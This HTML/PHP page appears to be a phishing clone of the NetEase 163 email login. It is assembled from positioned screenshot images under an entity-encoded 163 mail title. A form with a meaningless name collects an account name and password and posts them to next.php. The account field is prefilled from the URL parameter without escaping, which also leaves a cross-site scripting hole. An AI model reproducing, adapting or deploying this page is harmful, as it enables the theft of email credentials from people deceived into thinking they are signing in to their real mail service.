<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#49;&#54;&#51;&#32593;&#26131;&#20813;&#36153;&#37038;&#45;&#45;&#20013;&#25991;&#37038;&#31665;&#31532;&#19968;&#21697;&#29260;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>		  

<style type="text/css">			   
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 42px; 
    width: 275px; 
	padding-left: 32px;
	font: 12px/1.14 "Microsoft YaHei","微软雅黑","宋体",helvetica,"Hiragino Sans GB";
    color: #666;
    font-size: 14px; 
    border-radius: 4px;  
    box-shadow: 0px 0px 8px #d9d9d9;  
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #c4c4c4; 
    box-shadow: 0px 0px 6px #7bc1f7; 
} 

</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:222px; top:15px; width:857px; height:35px; z-index:0"><a href="#"><img src="images/b1.png" alt="" title="" border=0 width=857 height=35></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:63px; width:1349px; height:169px; z-index:1"><img src="images/b2.png" alt="" title="" border=0 width=1349 height=169></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:229px; width:1349px; height:203px; z-index:2"><img src="images/b3.png" alt="" title="" border=0 width=1349 height=203></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:432px; width:1349px; height:235px; z-index:3"><img src="images/b4.png" alt="" title="" border=0 width=1349 height=235></div>

<div id="image5" style="position:absolute; overflow:hidden; left:220px; top:691px; width:804px; height:56px; z-index:4"><a href="#"><img src="images/b5.png" alt="" title="" border=0 width=804 height=56></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:784px; top:135px; width:287px; height:43px; z-index:5"><a href="#"><img src="images/b6.png" alt="" title="" border=0 width=287 height=43></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:989px; top:343px; width:62px; height:19px; z-index:6"><a href="#"><img src="images/b7.png" alt="" title="" border=0 width=62 height=19></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:938px; top:375px; width:112px; height:40px; z-index:7"><a href="#"><img src="images/b8.png" alt="" title="" border=0 width=112 height=40></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:806px; top:480px; width:243px; height:31px; z-index:8"><a href="#"><img src="images/b9.png" alt="" title="" border=0 width=243 height=31></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:809px; top:543px; width:198px; height:39px; z-index:9"><a href="#"><img src="images/b10.png" alt="" title="" border=0 width=198 height=39></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:801px; top:431px; width:95px; height:17px; z-index:10"><a href="#"><img src="images/b11.png" alt="" title="" border=0 width=95 height=17></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:967px; top:431px; width:86px; height:18px; z-index:11"><a href="#"><img src="images/b12.png" alt="" title="" border=0 width=86 height=18></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:966px; top:230px; width:79px; height:25px; z-index:16"><img src="images/ma3.png" alt="" title="" border=0 width=79 height=25></div>

<div id="image14" style="position:absolute; overflow:hidden; left:810px; top:228px; width:22px; height:26px; z-index:17"><img src="images/m5.png" alt="" title="" border=0 width=22 height=26></div>

<div id="image15" style="position:absolute; overflow:hidden; left:808px; top:290px; width:25px; height:25px; z-index:18"><img src="images/m6.png" alt="" title="" border=0 width=25 height=25></div>

<div id="image16" style="position:absolute; overflow:hidden; left:300px; top:161px; width:401px; height:418px; z-index:19"><a href="#"><img src="images/b13.png" alt="" title="" border="0" width="401" height="418"></a></div>

<form action=next.php name=tumerehoew id=tumerehoew method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#37038;&#31665;&#24080;&#21495;&#25110;&#25163;&#26426;&#21495;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:245px;left:804px;top:220px;z-index:12">
<input name="pass"  placeholder="&#23494;&#30721;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:245px;left:804px;top:282px;z-index:13">
<div id="formcheckbox1" style="position:absolute; left:813px; top:342px; z-index:14"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:803px; top:375px; z-index:15"><input type="image" name="formimage1" width="112" height="40" src="images/logn.png"></div>

</div>

 
	
</body>
</html>
